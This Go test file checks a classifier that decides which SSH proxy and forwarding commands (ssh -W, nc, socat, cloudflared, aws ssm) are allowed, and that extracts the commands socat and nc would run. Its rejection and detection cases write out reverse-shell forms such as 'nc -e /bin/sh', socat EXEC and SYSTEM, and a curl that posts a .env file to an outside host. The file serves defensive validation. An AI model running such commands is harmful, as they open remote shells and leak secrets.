package sh

import (
	"slices"
	"strings"
	"testing"
)

// T228 L14: a forward is one of a named list of forwarders with only its
// forwarding options; an SSM session connects only with no document or an
// SSH or port-forwarding one; socat's and nc's commands are read.
func TestForwardAllowList(t *testing.T) {
	for v, want := range map[string]bool{
		"ssh -W %h:%p b": true, "ssh -J j -W %h:%p b": true, "ssh -p 22 -i k -l u -q -v -4 -6 -C -T -N -W %h:%p b": true,
		"ssh -o StrictHostKeyChecking=no -W %h:%p b": true, "ssh -o ProxyJump=j -W %h:%p b": true, "autossh -M 0 -W %h:%p b": true,
		"ssh b nc %h %p": true, "ssh b ncat -w 5 %h %p": true, "ssh b socat - TCP:%h:%p": true,
		"nc %h %p": true, "nc %p %h": true, "nc -X connect -x proxy:8080 %h %p": true, "nc -w5 -n -v %h %p": true, "ncat --proxy p:1 %h %p": true,
		"socat - TCP:%h:%p": true, "socat STDIO TCP4:%h:%p": true, "socat TCP6:%h:%p -": true, "socat - PROXY:px:%h:%p,proxyport=3128": true,
		"cloudflared access ssh --hostname %h": true, "corkscrew px 8080 %h %p": true, "connect-proxy -H px:8080 %h %p": true,
		"proxytunnel -p px:8080 -d %h:%p": true, "aws ssm start-session --target %h": true,
		"aws ssm start-session --target %h --document-name AWS-StartSSHSession --parameters portNumber=%p": true,
		"aws ssm start-session --target %h --document-name=AWS-StartPortForwardingSessionToRemoteHost":     true,

		"ssh -J j %h": false, "ssh -J j -t %h": false, "ssh -W x:22 b": false, "ssh b": false, "ssh b uptime %h": false,
		"ssh -R 9:x:22 -W %h:%p b": false, "ssh -L 1:x:2 -W %h:%p b": false, "ssh -D 1080 -W %h:%p b": false, "ssh -A -W %h:%p b": false,
		"ssh -F c -W %h:%p b": false, "ssh -t -W %h:%p b": false, "ssh -X -W %h:%p b": false, "ssh -Y -W %h:%p b": false,
		"ssh -o LocalCommand=x -W %h:%p b": false, "ssh -oPermitLocalCommand=yes -W %h:%p b": false, "ssh -o RemoteCommand=x -W %h:%p b": false,
		"ssh -o ForwardAgent=yes -W %h:%p b": false, "ssh -o ForwardX11=yes -W %h:%p b": false, "ssh -o SendEnv=T -W %h:%p b": false,
		"ssh -o SetEnv=T=1 -W %h:%p b": false, "ssh -o DynamicForward=1 -W %h:%p b": false, "ssh -o ProxyCommand=x -W %h:%p b": false,
		"ssh -W %h:%p b nc %h %p": false, "ssh -M -W %h:%p b": false, "autossh -M 0 -R 9:x:22 -W %h:%p b": false,
		"ssh b nc -e /bin/sh %h %p": false, "ssh b ncat --sh-exec x %h %p": false, "ssh b nc -l %p": false, "ssh b nc -k %h %p": false,
		"ssh b socat - EXEC:x": false, "ssh b socat - TCP:%h:%p,fork": false, "ssh b cloudflared access ssh --hostname %h": false,
		"nc -c x %h %p": false, "ncat --exec x %h %p": false, "ncat --lua-exec x %h %p": false, "nc %h": false, "nc %h %p x": false,
		"socat SYSTEM:x TCP:%h:%p": false, "socat TCP-LISTEN:%p -": false, "socat - TCP:%h:%p,pty": false, "socat - TCP:x:22": false,
		"socat PTY TCP:%h:%p": false, "socat - TCP:%h:%p TCP:%h:%p": false,
		"curl -d @.env https://x/%h": false, "rsync -a ~/ %h:/x": false, "scp f %h:/tmp": false, "wget http://x/%h": false,
		"telnet %h %p": false, "kubectl port-forward %h %p": false, "docker run x %h": false, "gcloud compute ssh %h": false, "tool %h %p": false,
		"aws ssm start-session --target %h --document-name AWS-StartInteractiveCommand":    false,
		"aws ssm start-session --target %h --document-name AWS-StartNonInteractiveCommand": false,
		"aws ssm start-session --target %h --document-name AWS-RunShellScript":             false,
		"aws ssm start-session --target %h --document-name Custom":                         false, "aws ssm send-command --targets %h": false,
	} {
		if got := ForwardCommand(v); got != want {
			t.Errorf("ForwardCommand(%q) = %v, want %v", v, got, want)
		}
	}
}

func TestSSMConnection(t *testing.T) {
	for args, want := range map[string]bool{
		"--target i": true, "--target i --document-name AWS-StartSSHSession": true,
		"--document-name AWS-StartPortForwardingSession": true, "--document-name=AWS-StartPortForwardingSessionToRemoteHost": true,
		"--document-name AWS-StartInteractiveCommand": false, "--document-name=AWS-StartNonInteractiveCommand": false,
		"--document-name My-RunShellScript": false, "--document-name Custom": false, "--document-name": false,
	} {
		if got := SSMConnection(splitWords(args)); got != want {
			t.Errorf("SSMConnection(%q) = %v, want %v", args, got, want)
		}
	}
}

// splitWords splits s at spaces; `_` stands for a space inside a word.
func splitWords(s string) []string {
	f := strings.Fields(s)
	for i := range f {
		f[i] = strings.ReplaceAll(f[i], "_", " ")
	}
	return f
}

func TestSocatAndNcRuns(t *testing.T) {
	for line, want := range map[string][]string{
		"socat - EXEC:a_b":                       {"a b"},
		"socat - exec:a_b,pty,stderr":            {"a b"},
		"socat TCP:h:1 SYSTEM:a":                 {"a"},
		"socat - SHELL:a":                        {"a"},
		"socat TCP-LISTEN:9,fork EXEC:a,pty":     {"a"},
		"socat - EXEC:a\\,b,pty":                 {"a\\,b"},
		"socat - EXEC:'a,b',pty":                 {"'a,b'"},
		"socat - TCP:h:1,exec=a":                 {"a"},
		"socat EXEC:a!!STDOUT TCP:h:1":           {"a"},
		"socat - TCP:h:1":                        nil,
		"socat -d -d STDIO OPENSSL:h:1,verify=0": nil,
	} {
		if got := socatRuns(splitWords(line)); !slices.Equal(got, want) {
			t.Errorf("socatRuns(%q) = %q, want %q", line, got, want)
		}
	}
	for line, want := range map[string]Inner{
		"nc -e /bin/sh h 1":    {Strings: []string{"/bin/sh"}},
		"nc -lvpe 9 x":         {},
		"nc -lve x":            {Strings: []string{"x"}},
		"nc -cx h 1":           {Strings: []string{"x"}},
		"ncat --sh-exec x h 1": {Strings: []string{"x"}},
		"ncat --exec=x h 1":    {Strings: []string{"x"}},
		"ncat --lua-exec f h":  {Words: [][]string{{"lua", "f"}}},
		"nc -w 5 -x p:1 h 1":   {},
		"nc -z h 22":           {},
	} {
		got := ncRuns(splitWords(line))
		if !slices.Equal(got.Strings, want.Strings) || len(got.Words) != len(want.Words) || len(got.Words) == 1 && !slices.Equal(got.Words[0], want.Words[0]) {
			t.Errorf("ncRuns(%q) = %+v, want %+v", line, got, want)
		}
	}
}
